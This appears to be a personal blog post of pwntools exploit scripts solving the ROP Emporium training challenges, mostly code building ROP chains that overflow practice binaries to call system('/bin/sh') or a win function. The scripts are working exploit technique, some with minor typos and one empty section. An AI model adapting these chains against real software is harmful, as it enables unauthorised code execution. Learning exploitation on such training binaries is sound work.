---
layout: post
title: "ROP Emporium solutions"
date: 2020-04-01
categories: jekyll update
---

# Introduction
Here are the solutions of the [ROP Emporium](https://ropemporium.com/) challenges made by Max Kamper, he is extremely knowledgeable about binary exploitation, and has the ability to to easily teach advanced topics divided into digestible fast "chunks", check him out!


The challenges were great to train with, managed to do 7/8 for the x64, had to read some writeups for pivot one, once again, did not properly document my thought process, but still it might be usefull for some people looking for original solutions, will maybe improve them over time, I hope you like them in the meantime, for the x86 ones, they are practically the same, the size of the registers and calling convention are the only difference I presume.

# ret2win
```python
#!/usr/bin/env python3
from pwn import *

exe = './ret2win'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
gdbscript = '''
continue
'''.format(**locals())

io = start()
ret2win= p64(0x0000000000400811)
padding=40*'A'.encode()

io.send(padding+ret2win)

io.interactive()
```

# split
```python
i#!/usr/bin/env python3
from pwn import *

exe = './split'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
gdbscript = '''
continue
'''.format(**locals())

io = start()
uf= p64(0x0000000000400807)
padding=40*'A'.encode()

system=p64( 0x0000000000400810)
cat_flag=p64(0x00601060)
pop_rdi= p64(0x0000000000400883)

io.sendline(padding+pop_rdi+cat_flag+system)#+uf)
io.interactive()

```

# callme
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = './callme'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
gdbscript = '''
continue
'''.format(**locals())

io = start()

padding='A'.encode()*40
call_1=p64(0x0000000000401850)
call_2=p64(0x0000000000401870)
call_3=p64(0x0000000000401810)

#0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
pop_rdi_rsi_rdx= p64(0x401ab0)
payload=  padding
payload+= pop_rdi_rsi_rdx+ p64(0x1)+ p64(0x2)+ p64(0x3)+call_1
payload+= pop_rdi_rsi_rdx+ p64(0x1)+ p64(0x2)+ p64(0x3)+call_2
payload+= pop_rdi_rsi_rdx+ p64(0x1)+ p64(0x2)+ p64(0x3)+call_3

io.sendline(payload)
io.interactive()

```

# write4
```python
#!/usr/bin/env python3
from pwn import *

exe = './write4'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
dbscript = '''
continue
'''.format(**locals())

# Gadgets
#0x0000000000400820: mov qword ptr [r14], r15; ret; 
#0x0000000000400890: pop r14; pop r15; ret;
#0x0000000000400893: pop rdi; ret; 

def WriteMem(Where,What):
    mov_15_to_PTR14=p64(0x400820)
    pop_14_15=p64(0x400890)
    print(What,pop_14_15)
    payload=pop_14_15+Where+What+mov_15_to_PTR14
    return payload

padding= 40*'A'.encode()
io = start()

uf= p64(0x400807)
system= p64(0x400810)
writable=p64(0x601050)
pop_rdi=p64(0x400893)

payload = padding
payload+= WriteMem(  writable  ,  b'/bin/sh\x00' )  
payload+= pop_rdi+ writable
payload+= system
#payload+=  WriteMem(  writable2  , b'/sh\x00' )  
payload+=uf
io.sendline(payload)
f=open("payload","wb")
f.write(payload)
io.interactive()
```

# badchars
```python
#!/usr/bin/env python3 
from pwn import *

exe = './badchars'
context.update(arch='i386')
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

dbscript = '''
continue
'''.format(**locals())


# Gadgets
#0x0000000000400b3b: pop r12; pop r13; ret;
#0x0000000000400b34: mov qword ptr [r13], r12; ret; 

#0x0000000000400b40: pop r14; pop r15; ret;
#0x0000000000400b30: xor byte ptr [r15], r14b; ret;

#0x0000000000400b39: pop rdi; ret;

#0x00000000004008ee: mov eax, 0; pop rbp; ret; 

badchars=  [b'b',b'i',b'c', b'/', b' ', b'f', b'n', b's']
cmd=b'/bin/sh\x00'
offset=15
data_sec=0x601070 + offset
data=p64(data_sec)

def WriteMem(Where,What):
    pop_12_13=p64(0x400b3b)
    mov_12_in_pt13=p64(0x400b34)
    payload=pop_12_13+What+Where+mov_12_in_pt13
    return payload
def XorByte(Where,key):
    pop_14_15=p64(0x400b40)
    xor_14_ptr15=p64(0x400b30)
    payload=pop_14_15+key+Where+xor_14_ptr15
    return payload

xored_cmd=badchars

key=0
# Be sure xored_cmd do not contain badchars, else increment key.
while len([e for e in badchars if e in xored_cmd]) != 0:
    key+=1
    xored_cmd=''.join([chr((i) ^ key) for i in cmd]).encode()
    print( xored_cmd,key)

padding='A'.encode()*40
payload=padding

## Write xored_cmd in data section
payload += WriteMem(data,xored_cmd)

### Xor payload in data section
for i in range(8): 
    payload += XorByte(p64(data_sec+i),p64(key))

### Pop clear cmd into rdi and call system
pop_rdi=p64(0x400b39)
call_system=p64(0x4009e8)
#libc_system=p64(0x00007ffff7e3eed0)
system= p64(0x4006F0)
payload += pop_rdi+data+system


uf =p64(0x00000000004009df)
#payload += uf
exit=p64(0x0000000000400770)
mov_eax_0=p64(0x4008ee)
payload+=mov_eax_0+p64(0)+exit
io = start()


io.sendline(payload)
f= open('payload','wb')
f.write(payload)
io.interactive()

```
# fluff
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='i386')
exe = './fluff'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


# Gadgets
#0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
#Dump of assembler code for function questionableGadgets:
                                    # Control r15,r14, set r11 zero
   #0x0000000000400820 <+0>:   pop    r15
   #0x0000000000400822 <+2>:   xor    r11,r11 
   #0x0000000000400825 <+5>:   pop    r14
   #0x0000000000400827 <+7>:   mov    edi,0x601050
   #0x000000000040082c <+12>:  ret

                                    # Control r14 r12
   #0x000000000040082d <+13>:  pop    r14
   #0x000000000040082f <+15>:  xor    r11,r12
   #0x0000000000400832 <+18>:  pop    r12
   #0x0000000000400834 <+20>:  mov    r13d,0x604060
   #0x000000000040083a <+26>:  ret
                                    # Control r15 swap 11 10
   #0x000000000040083b <+27>:  mov    edi,0x601050
   #0x0000000000400840 <+32>:  xchg   r11,r10     Swap content r11 r10
   #0x0000000000400843 <+35>:  pop    r15 
   #0x0000000000400845 <+37>:  mov    r11d,0x602050
   #0x000000000040084b <+43>:  ret
                                    
                                   # control r15, r13,r12, write to r10 with r11
   #0x000000000040084c <+44>:  pop    r15
   #0x000000000040084e <+46>:  mov    QWORD PTR [r10],r11
   #0x0000000000400851 <+49>:  pop    r13
   #0x0000000000400853 <+51>:  pop    r12
   #0x0000000000400855 <+53>:  xor    BYTE PTR [r10],r12b
   #0x0000000000400858 <+56>:  ret
   #0x0000000000400859 <+57>:  nop    DWORD PTR [rax+0x0]
##End of assembler dump.
#0x0000000000400719: add ebx, esi; ret;
#0x00000000004005b6: add esp, 8; ret;
#0x00000000004005b5: add rsp, 8; ret;
#0x00000000004008cf: add bl, dh; ret;
#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 

#Control over 15,14,13,12   r11=O  *r10=r11  *r10=r12

# swap r11 r10, xor r11,r12
#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
#0x0000000000400840 <+32>:  xchg   r11,r10     Swap content r11 r10
# so can control r10 and r11
#0x000000000040084e <+46>:  mov    QWORD PTR [r10],r11
# Finally can write to memory /bin/sh and call system




cmd=b'/bin/sh\x00'
def setR12(value): # Modif r13
    pop_12=p64(0x400832)
#0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
    buff=pop_12
    if value!=cmd: # Check if its cmd, dont p64 again .
        buff+=p64(value)
    else :
        buff+=value
    return  buff

def setR11(value11): #Modif r14 edi, r12 r13d
    xor_11_11= p64(0x400822)
    xor_11_12= p64(0x40082f)
#0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
    buff= xor_11_11+p64(0)
    buff+= setR12(value11)
#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
    buff+= xor_11_12+p64(0)
    return  buff

def setR10(value10,r15=0):
# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
    xchg_11_10=p64(0x400840)
    return setR11(value10)+xchg_11_10+p64(r15)


def WriteMem(valueWM,Where):
# 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
    mov_11_PTR10= p64(0x40084e)
    # Setup r10 and r11
    buff = setR10(Where)
    buff+= setR11(valueWM)
    # Write into memory
    buff+= mov_11_PTR10+ p64(0)+ p64(0)
    return buff
io = start()

padding=40*'A'.encode()

bss= (0x601060)
payload=padding+WriteMem(cmd,bss)
#0x00000000004008c3: pop rdi; ret;
payload+=p64(0x4008c3)+p64(bss)
system=p64(0x4005e0)  

payload+=system
f=open('payload','wb')
f.write(payload)
f.close()
io.sendline(payload)


io.interactive()

#
  #[20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
       #0000000000000008  0000000000000000  WA       0     0     8
  #[21] .jcr              PROGBITS         0000000000600e20  00000e20
       #0000000000000008  0000000000000000  WA       0     0     8
  #[22] .dynamic          DYNAMIC          0000000000600e28  00000e28
       #00000000000001d0  0000000000000010  WA       6     0     8
  #[23] .got              PROGBITS         0000000000600ff8  00000ff8
       #0000000000000008  0000000000000008  WA       0     0     8
  #[24] .got.plt          PROGBITS         0000000000601000  00001000
       #0000000000000050  0000000000000008  WA       0     0     8
  #[25] .data             PROGBITS         0000000000601050  00001050
       #0000000000000010  0000000000000000  WA       0     0     8
  #[26] .bss              NOBITS           0000000000601060  00001060
       #0000000000000030  0000000000000000  WA       0     0     32
#

```

# pivot
```python
```




# ret2csu

```python
#!/usr/bin/env python3
from pwn import *

exe = '/root/ropemporium/ret2csu/ret2csu'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
finish
finish
finish
finish
finish
'''.format(**locals())

#0x000000000040089c: pop r12; pop r13; pop r14; pop r15; ret;
pop_12_13_14_15=p64(0x40089c)
ret= p64(0x600e48)
ret2win=p64(0x4007b1)



mov_rdx_rax=p64(0x400818)
io = start()
libc_csu_rdx=p64(0x400880)

rbp=p64(1)
payload=cyclic(32)+rbp
# Setup r12 = ret
_fini=p64(0x4008B4)
payload+=pop_12_13_14_15+ret+p64(0x1337)+p64(0x1337)+p64(0xdeadcafebabebeef)
payload+=libc_csu_rdx+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)
payload+=ret2win

#payload+
#payload+
#gdb.attach(io,gdbscript=gdbscript)
io.sendline(payload)
io.interactive()

# libc csu
#
   #0x0000000000400880 <+64>:    mov    rdx,r15  
   #0x0000000000400883 <+67>:    mov    rsi,r14
   #0x0000000000400886 <+70>:    mov    edi,r13d
   #0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8] # r12 + rbx *8 == mem ==> ret //rbx=0
   #0x000000000040088d <+77>:    add    rbx,0x1
   #0x0000000000400891 <+81>:    cmp    rbp,rbx # rbp = rbx+1 
   #0x0000000000400894 <+84>:    jne    0x400880 <__libc_csu_init+64>
   #0x0000000000400896 <+86>:    add    rsp,0x8
   #0x000000000040089a <+90>:    pop    rbx
   #0x000000000040089b <+91>:    pop    rbp
   #0x000000000040089c <+92>:    pop    r12
   #0x000000000040089e <+94>:    pop    r13
   #0x00000000004008a0 <+96>:    pop    r14
   #0x00000000004008a2 <+98>:    pop    r15
   #0x00000000004008a4 <+100>:   ret  


   #0x00000000004007b1 <+0>:     push   rbp
   #0x00000000004007b2 <+1>:     mov    rbp,rsp
   #0x00000000004007b5 <+4>:     sub    rsp,0x30
   #0x00000000004007b9 <+8>:     mov    DWORD PTR [rbp-0x24],edi
   #0x00000000004007bc <+11>:    mov    DWORD PTR [rbp-0x28],esi
   #0x00000000004007bf <+14>:    mov    QWORD PTR [rbp-0x30],rdx
   #0x00000000004007c3 <+18>:    mov    rax,QWORD PTR [rip+0x15e]        # 0x400928
   #0x00000000004007ca <+25>:    mov    rdx,QWORD PTR [rip+0x15f]        # 0x400930
   #0x00000000004007d1 <+32>:    mov    QWORD PTR [rbp-0x20],rax
   #0x00000000004007d5 <+36>:    mov    QWORD PTR [rbp-0x18],rdx
   #0x00000000004007d9 <+40>:    movzx  eax,WORD PTR [rip+0x158]        # 0x400938
   #0x00000000004007e0 <+47>:    mov    WORD PTR [rbp-0x10],ax
   #0x00000000004007e4 <+51>:    lea    rax,[rbp-0x20]
   #0x00000000004007e8 <+55>:    mov    QWORD PTR [rbp-0x8],rax
   #0x00000000004007ec <+59>:    mov    rax,QWORD PTR [rbp-0x8]
   #0x00000000004007f0 <+63>:    mov    rax,QWORD PTR [rax]
   #0x00000000004007f3 <+66>:    xor    rax,QWORD PTR [rbp-0x30]
   #0x00000000004007f7 <+70>:    mov    rdx,rax
   #0x00000000004007fa <+73>:    mov    rax,QWORD PTR [rbp-0x8]
   #0x00000000004007fe <+77>:    mov    QWORD PTR [rax],rdx
   #0x0000000000400801 <+80>:    lea    rax,[rbp-0x20]
   #0x0000000000400805 <+84>:    add    rax,0x9
   #0x0000000000400809 <+88>:    mov    QWORD PTR [rbp-0x8],rax
   #0x000000000040080d <+92>:    mov    rax,QWORD PTR [rbp-0x8]
   #0x0000000000400811 <+96>:    mov    rax,QWORD PTR [rax]
   #0x0000000000400814 <+99>:    xor    rax,QWORD PTR [rbp-0x30]     0x30var must be xor of 0xdeadcafebebeef
   #0x0000000000400818 <+103>:   mov    rdx,rax                     rax must be 0xdeadcaf
   #0x000000000040081b <+106>:   mov    rax,QWORD PTR [rbp-0x8]
   #0x000000000040081f <+110>:   mov    QWORD PTR [rax],rdx
   #0x0000000000400822 <+113>:   lea    rax,[rbp-0x20]
   #0x0000000000400826 <+117>:   mov    rdi,rax
   #0x0000000000400829 <+120>:   call   0x4005a0 <system@plt> (rdx) must be 0xdeadcafebabebeef
   #0x000000000040082e <+125>:   nop
   #0x000000000040082f <+126>:   leave
   #0x0000000000400830 <+127>:   ret
#
   #gef➤  x/10i 0x4008b4
   #0x4008b4 <_fini>:    sub    rsp,0x8
   #0x4008b8 <_fini+4>:  add    rsp,0x8
   #0x4008bc <_fini+8>:  ret
   #0x4008bd:    Cannot access memory at address 0x4008bd
#gef➤  x/100x &_DYNAMIC
#0x600e20:       0x00000001      0x00000000      0x00000001      0x00000000
#0x600e30:       0x0000000c      0x00000000      0x00400560      0x00000000
#0x600e40:       0x0000000d      0x00000000      0x004008b4      0x00000000
#
```
